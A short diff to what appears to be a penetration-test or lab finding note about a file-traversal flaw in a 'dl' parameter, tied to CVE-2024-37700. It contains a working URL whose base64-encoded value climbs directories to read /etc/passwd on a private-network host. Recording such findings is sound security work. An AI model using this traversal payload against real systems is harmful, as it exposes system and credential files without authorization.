@@ -1,3 +1,6 @@
+Use CVE-2024-37700
+
+
 Vulnerability: File Traversal via dl
 
 URL: ```https://192.168.124.130/logs?dl=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA%3d%3d```
